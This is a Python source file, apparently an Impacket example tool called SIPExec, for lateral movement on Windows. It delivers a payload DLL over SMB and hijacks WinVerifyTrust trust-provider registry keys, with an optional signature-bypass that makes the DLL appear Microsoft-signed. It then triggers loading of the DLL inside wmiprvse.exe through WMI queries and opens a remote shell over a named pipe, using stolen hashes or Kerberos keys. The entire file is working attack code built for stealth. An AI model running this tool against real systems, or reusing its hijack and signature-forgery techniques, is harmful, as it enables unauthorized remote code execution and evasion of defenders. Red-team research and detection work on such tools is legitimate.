#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# SIPExec - Executes commands via WinVerifyTrust Trust Provider hijack.
#
# Instead of creating services, scheduled tasks, or spawning shells,
# it hijacks a Trust Provider registry key and triggers a WMI query
# that forces the WMI provider host (wmiprvse.exe) to call WinVerifyTrust,
# loading the payload DLL into that process. Communication happens over
# a named pipe inside wmiprvse.exe.
#
# Default: uploads payload DLL via SMB to ADMIN$, points registry at it.
# With -serve: hosts DLL on a local SMB server, target loads via UNC (fileless).
# With -dll: skip upload, use a pre-existing DLL path on target.
#
# No service installation. No new visible process. Trigger is a WMI query.
#

from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import argparse
import time
import logging
import threading
import tempfile
import random
import string

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version, smbserver
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.krb5.keytab import Keytab

HKLM = 0x80000002
FP_KEY = 'SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}'
SIP_KEY = 'SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'
EXPORT_NAME = 'SipExecFinalPolicy'
PIPE_DONE_MARKER = b'[SIPEXEC_DONE]'
CODEC = sys.stdout.encoding
PAYLOAD_DLL = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sipexec_payload_signed.dll')
if not os.path.exists(PAYLOAD_DLL):
    PAYLOAD_DLL = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sipexec_payload.dll')
REMOTE_DLL_NAME = 'sipexec_' + ''.join(random.choices(string.ascii_lowercase, k=6)) + '.dll'


class SMBServer(threading.Thread):
    """Local SMB server to host the payload DLL (fileless mode)."""
    def __init__(self, share_path, listen_address='0.0.0.0', listen_port=445):
        threading.Thread.__init__(self, daemon=True)
        self.share_path = share_path
        self.listen_address = listen_address
        self.listen_port = listen_port
        self.server = None

    def run(self):
        from configparser import ConfigParser
        smbConfig = ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global', 'server_name', 'server')
        smbConfig.set('global', 'server_os', 'UNIX')
        smbConfig.set('global', 'server_domain', 'WORKGROUP')
        smbConfig.set('global', 'SMB2Support', 'True')
        smbConfig.set('global', 'log_file', '')
        smbConfig.set('global', 'credentials_file', '')

        smbConfig.add_section('SIPEXEC')
        smbConfig.set('SIPEXEC', 'comment', '')
        smbConfig.set('SIPEXEC', 'read only', 'yes')
        smbConfig.set('SIPEXEC', 'share type', '0')
        smbConfig.set('SIPEXEC', 'path', self.share_path)

        self.server = smbserver.SMBSERVER((self.listen_address, self.listen_port), config_parser=smbConfig)
        self.server.processConfigFile()
        logging.info(f'SMB server started on {self.listen_address}:{self.listen_port} sharing {self.share_path}')
        try:
            self.server.serve_forever()
        except:
            pass

    def stop(self):
        if self.server:
            self.server.socket.close()
            self.server.server_close()


class SIPEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None,
                 aesKey=None, doKerberos=False, kdcHost=None, dllPath=None,
                 noOutput=False, serve=False, listenAddress=None, sigHijack=False):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__dllPath = dllPath  # explicit path override (skip upload)
        self.__noOutput = noOutput
        self.__serve = serve  # host DLL via SMB server (fileless)
        self.__listenAddress = listenAddress
        self.__sigHijack = sigHijack  # TrustMeBro-style SIP hijack
        self.__origDll = 'WINTRUST.DLL'
        self.__origFunc = 'SoftpubAuthenticode'
        self.__origSipDll = 'WINTRUST.DLL'
        self.__origSipFunc = 'CryptSIPVerifyIndirectData'
        self.__smbConnection = None
        self.__pipeTid = None
        self.__pipeFid = None
        self.__smbServer = None
        self.__uploaded = False
        self.__remoteDllPath = None
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        try:
            # Step 0: Get DLL to target
            self.__stageDll(addr)

            # Step 1: Hijack FinalPolicy
            logging.info('Hijacking Trust Provider FinalPolicy...')
            self.__hijack(addr)

            # Step 2: Kill cached wmiprvse so next query spawns fresh one
            self.__resetWmiprvse(addr)

            # Step 3: Trigger WVT via WMI provider load
            logging.info('Triggering WVT via Win32_PnPSignedDriver query...')
            self.__trigger(addr)

            # Step 4: Wait for DLL to load
            time.sleep(2)

            # Step 5: Connect to pipe
            if self.__noOutput is False:
                self.__smbConnection = SMBConnection(addr, addr)
                if self.__doKerberos is False:
                    self.__smbConnection.login(self.__username, self.__password, self.__domain,
                                               self.__lmhash, self.__nthash)
                else:
                    self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain,
                                                       self.__lmhash, self.__nthash, self.__aesKey,
                                                       kdcHost=self.__kdcHost)
                self.__smbConnection.setTimeout(100000)

            if not self.__connectPipe(timeout=20):
                logging.error('Could not find SIPExec pipe. Target may have WMI providers cached.')
                logging.error('Try again after ~5min (wmiprvse idle timeout) or reboot target.')
                return

            logging.info('Connected to pipe inside wmiprvse.exe')

            if self.__command != '':
                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid)
                self.shell.onecmd(self.__command)
            else:
                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid)
                self.shell.cmdloop()

        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            if str(e):
                logging.error(str(e))
        finally:
            self.__cleanup(addr)

    def __stageDll(self, addr):
        """Get the payload DLL accessible to the target."""
        if self.__dllPath:
            # User specified explicit path — use it directly
            self.__remoteDllPath = self.__dllPath
            logging.info(f'Using DLL at: {self.__remoteDllPath}')
            return

        if not os.path.exists(PAYLOAD_DLL):
            logging.error(f'Payload DLL not found: {PAYLOAD_DLL}')
            logging.error('Build it with: x86_64-w64-mingw32-gcc -shared -o sipexec_payload.dll sipexec_payload.c -Wall -O2')
            sys.exit(1)

        if self.__serve:
            # Host via local SMB server — fileless on target
            share_dir = tempfile.mkdtemp(prefix='sipexec_')
            import shutil
            shutil.copy2(PAYLOAD_DLL, os.path.join(share_dir, REMOTE_DLL_NAME))
            self.__smbServer = SMBServer(share_dir, self.__listenAddress or '0.0.0.0')
            self.__smbServer.start()
            time.sleep(1)
            listen = self.__listenAddress or self.__getLocalIP(addr)
            self.__remoteDllPath = f'\\\\{listen}\\SIPEXEC\\{REMOTE_DLL_NAME}'
            logging.info(f'Serving DLL via UNC: {self.__remoteDllPath}')
        else:
            # Default: upload via SMB to ADMIN$\Temp
            logging.info(f'Uploading payload DLL to target...')
            conn = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                conn.login(self.__username, self.__password, self.__domain,
                           self.__lmhash, self.__nthash)
            else:
                conn.kerberosLogin(self.__username, self.__password, self.__domain,
                                   self.__lmhash, self.__nthash, self.__aesKey,
                                   kdcHost=self.__kdcHost)
            with open(PAYLOAD_DLL, 'rb') as f:
                dll_data = f.read()
            # ponytail: impacket putFile callback takes maxLength, must return b'' when done
            sent = [False]
            def write_cb(maxLen):
                if sent[0]:
                    return b''
                sent[0] = True
                return dll_data
            conn.putFile('ADMIN$', f'Temp\\{REMOTE_DLL_NAME}', write_cb)
            conn.logoff()
            self.__remoteDllPath = f'C:\\Windows\\Temp\\{REMOTE_DLL_NAME}'
            self.__uploaded = True
            logging.info(f'DLL uploaded to {self.__remoteDllPath}')

    def __getLocalIP(self, target):
        """Get the local IP that routes to target."""
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 445))
            return s.getsockname()[0]
        finally:
            s.close()

    def __dcom(self, addr):
        return DCOMConnection(addr, self.__username, self.__password, self.__domain,
                              self.__lmhash, self.__nthash, self.__aesKey,
                              doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

    def __wmiNamespace(self, dcom, namespace):
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
        iWbemLevel1Login.RemRelease()
        return iWbemServices

    def __hijack(self, addr):
        dcom = self.__dcom(addr)
        iWbemServices = self.__wmiNamespace(dcom, '//./root/default')
        stdRegProv, _ = iWbemServices.GetObject('StdRegProv')

        # Save originals
        self.__origDll = stdRegProv.GetStringValue(HKLM, FP_KEY, '$DLL').sValue
        self.__origFunc = stdRegProv.GetStringValue(HKLM, FP_KEY, '$Function').sValue

        # TrustMeBro-style SIP hijack (optional): makes our DLL appear "Valid" signed
        if self.__sigHijack:
            self.__origSipDll = stdRegProv.GetStringValue(HKLM, SIP_KEY, 'Dll').sValue
            self.__origSipFunc = stdRegProv.GetStringValue(HKLM, SIP_KEY, 'FuncName').sValue
            stdRegProv.SetStringValue(HKLM, SIP_KEY, 'Dll', 'C:\\Windows\\System32\\ntdll.dll')
            stdRegProv.SetStringValue(HKLM, SIP_KEY, 'FuncName', 'DbgUiContinue')
            logging.info('SIP hijacked (DLL will appear Microsoft-signed)')

        # FinalPolicy hijack: loads our DLL on next WVT call
        stdRegProv.SetStringValue(HKLM, FP_KEY, '$DLL', self.__remoteDllPath)
        stdRegProv.SetStringValue(HKLM, FP_KEY, '$Function', EXPORT_NAME)
        logging.debug(f'FinalPolicy -> {self.__remoteDllPath}')

        iWbemServices.RemRelease()
        dcom.disconnect()

    def __resetWmiprvse(self, addr):
        """Terminate cached wmiprvse instances so next WMI query gets a fresh one."""
        try:
            dcom = self.__dcom(addr)
            iWbemServices = self.__wmiNamespace(dcom, '//./root/cimv2')
            result = iWbemServices.ExecQuery(
                'SELECT ProcessId FROM Win32_Process WHERE Name="wmiprvse.exe"')
            pids = []
            try:
                while True:
                    obj = result.Next(0xffffffff, 1)[0]
                    pids.append(obj.ProcessId)
            except:
                pass
            for pid in pids:
                try:
                    proc, _ = iWbemServices.GetObject(f'Win32_Process.Handle="{pid}"')
                    proc.Terminate(1)
                except:
                    pass
            iWbemServices.RemRelease()
            dcom.disconnect()
        except:
            pass  # Expected — our own wmiprvse dies mid-call
        time.sleep(2)

    def __triggerThread(self, addr):
        """Fire WMI queries that force provider loads.
        Win32_PnPSignedDriver (~1s) loads Cimwin32A provider.
        Win32_SoftwareFeature (~3s) loads MSI provider.
        Each triggers WVT once when provider first loads."""
        try:
            dcom = self.__dcom(addr)
            iWbemServices = self.__wmiNamespace(dcom, '//./root/cimv2')
            # Try both — first hit wins, second is insurance
            for query in [
                'SELECT * FROM Win32_PnPSignedDriver WHERE DeviceName="null"',
                'SELECT * FROM Win32_SoftwareFeature WHERE Name="null"',
            ]:
                try:
                    iEnum = iWbemServices.ExecQuery(query)
                    try:
                        iEnum.Next(0xffffffff, 1)
                    except:
                        pass
                except:
                    pass
            iWbemServices.RemRelease()
            dcom.disconnect()
        except:
            pass

    def __trigger(self, addr):
        t = threading.Thread(target=self.__triggerThread, args=(addr,), daemon=True)
        t.start()

    def __connectPipe(self, timeout=60):
        if self.__smbConnection is None:
            return False
        self.__pipeTid = self.__smbConnection.connectTree('IPC$')
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                self.__pipeFid = self.__smbConnection.openFile(self.__pipeTid, 'sipexec')
                time.sleep(0.5)
                greeting = self.__smbConnection.readNamedPipe(self.__pipeTid, self.__pipeFid, 4096)
                logging.debug(greeting.decode('utf-8', errors='replace').strip())
                return True
            except:
                time.sleep(2)
        return False

    def __cleanup(self, addr):
        # Close pipe
        if self.__pipeFid:
            try:
                self.__smbConnection.writeNamedPipe(self.__pipeTid, self.__pipeFid, b'exit')
            except:
                pass
            try:
                self.__smbConnection.closeFile(self.__pipeTid, self.__pipeFid)
            except:
                pass
        if self.__smbConnection:
            try:
                self.__smbConnection.logoff()
            except:
                pass

        # Restore FinalPolicy + SIP
        logging.info('Restoring Trust Provider...')
        try:
            dcom = self.__dcom(addr)
            iWbemServices = self.__wmiNamespace(dcom, '//./root/default')
            stdRegProv, _ = iWbemServices.GetObject('StdRegProv')
            stdRegProv.SetStringValue(HKLM, FP_KEY, '$DLL', self.__origDll)
            stdRegProv.SetStringValue(HKLM, FP_KEY, '$Function', self.__origFunc)
            if self.__sigHijack:
                stdRegProv.SetStringValue(HKLM, SIP_KEY, 'Dll', self.__origSipDll)
                stdRegProv.SetStringValue(HKLM, SIP_KEY, 'FuncName', self.__origSipFunc)
            iWbemServices.RemRelease()
            dcom.disconnect()
        except Exception as e:
            logging.error(f'Could not restore: {e}')

        # Delete uploaded DLL
        if self.__uploaded:
            try:
                conn = SMBConnection(addr, addr)
                if self.__doKerberos is False:
                    conn.login(self.__username, self.__password, self.__domain,
                               self.__lmhash, self.__nthash)
                else:
                    conn.kerberosLogin(self.__username, self.__password, self.__domain,
                                       self.__lmhash, self.__nthash, self.__aesKey,
                                       kdcHost=self.__kdcHost)
                conn.deleteFile('ADMIN$', f'Temp\\{REMOTE_DLL_NAME}')
                conn.logoff()
                logging.debug('Uploaded DLL deleted')
            except:
                pass

        # Stop SMB server
        if self.__smbServer:
            self.__smbServer.stop()
            logging.debug('SMB server stopped')


class RemoteShell(cmd.Cmd):
    def __init__(self, smbConnection, tid, fid):
        cmd.Cmd.__init__(self)
        self.__smbConnection = smbConnection
        self.__tid = tid
        self.__fid = fid
        self.__outputBuffer = ''
        self.intro = '[!] SIPExec v2 - shell inside wmiprvse.exe via WMI query trigger\n' \
                     '[!] Careful what you execute\n'
        self.prompt = 'C:\\Windows\\system32>'

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print("""
 lcd {path}     - changes the current local directory
 exit           - terminates the session and restores the target
 ! {cmd}        - executes a local shell cmd
""")

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_exit(self, s):
        return True

    def do_EOF(self, s):
        print()
        return self.do_exit(s)

    def emptyline(self):
        return False

    def default(self, line):
        if line != '':
            self.execute_remote(line)
            print(self.__outputBuffer)
            self.__outputBuffer = ''

    def execute_remote(self, data):
        try:
            self.__smbConnection.writeNamedPipe(self.__tid, self.__fid, data.encode('utf-8'))
        except Exception as e:
            logging.error(f'Error sending command: {e}')
            return

        output = b''
        while True:
            try:
                chunk = self.__smbConnection.readNamedPipe(self.__tid, self.__fid, 65536)
                output += chunk
                if PIPE_DONE_MARKER in output:
                    break
            except:
                break

        self.__outputBuffer = output.decode(CODEC, errors='replace').split('[SIPEXEC_DONE]')[0].rstrip('\r\n')


if __name__ == '__main__':
    print(version.BANNER)
    print('SIPExec v2 - Trust Provider lateral movement via WMI query trigger')
    print('Code executes inside wmiprvse.exe. No new process created.\n')

    parser = argparse.ArgumentParser(add_help=True, description="Executes a semi-interactive shell "
                                                                "by hijacking WinVerifyTrust Trust Provider "
                                                                "and triggering via WMI query.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('command', nargs='*', default=' ', help='command to execute at the target. '
                                                                'If empty it will launch a semi-interactive shell')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output '
                                                       '(default "%s").' % CODEC)
    parser.add_argument('-nooutput', action='store_true', default=False,
                        help='whether or not to print the output (no SMB connection created)')

    delivery = parser.add_argument_group('payload delivery')
    delivery.add_argument('-serve', action='store_true', default=False,
                          help='Host payload DLL on a local SMB server (fileless on target). '
                               'Target loads DLL via UNC path. Requires port 445 available locally.')
    delivery.add_argument('-listen', action='store', metavar='ip',
                          help='IP to bind the SMB server on (default: auto-detect route to target)')
    delivery.add_argument('-dll', action='store', metavar='path',
                          help='Skip upload. Use this DLL path directly (must be accessible from target). '
                               'Example: C:\\Windows\\Temp\\pay.dll or \\\\attacker\\share\\pay.dll')
    delivery.add_argument('-sig-hijack', action='store_true', default=False,
                          help='TrustMeBro-style: hijack SIP VerifyIndirectData so the payload DLL '
                               'appears validly signed (Microsoft cert + hash bypass). Restored on exit.')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                       help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true",
                       help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters.')
    group.add_argument('-aesKey', action="store", metavar="hex key",
                       help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller.')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.codec is not None:
        CODEC = options.codec

    domain, username, password, address = parse_target(options.target)

    try:
        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None \
                and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        command = ' '.join(options.command)
        if command == ' ':
            command = ''

        executer = SIPEXEC(command, username, password, domain, options.hashes,
                           options.aesKey, options.k, options.dc_ip, options.dll,
                           options.nooutput, options.serve, options.listen,
                           options.sig_hijack)
        executer.run(address)

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)
